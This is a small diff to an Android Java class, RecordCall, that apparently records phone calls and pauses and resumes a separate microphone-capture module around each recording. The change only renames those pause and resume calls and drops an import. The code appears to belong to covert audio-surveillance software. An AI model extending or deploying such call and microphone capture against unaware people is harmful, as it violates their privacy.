@@ -8,7 +8,6 @@ import android.media.MediaRecorder;
 import android.os.Build;
 
 import com.android.dvci.Call;
-import com.android.dvci.Core;
 import com.android.dvci.Device;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
@@ -305,7 +304,7 @@ public class RecordCall {
 				ModuleMic mic = ModuleMic.self();
 
 				if (mic != null) {
-					mic.resume();
+					mic.base_resume();
 				}
 			}
 
@@ -332,7 +331,7 @@ public class RecordCall {
 		ModuleMic mic = ModuleMic.self();
 
 		if (mic != null) {
-			mic.suspend();
+			mic.base_suspend();
 		}
 
 		if (startRecord(strategy, outputFormat, audioEncoder, path) == true) {
@@ -347,7 +346,7 @@ public class RecordCall {
 		mic = ModuleMic.self();
 
 		if (mic != null) {
-			mic.resume();
+			mic.base_resume();
 		}
 
 		return false;
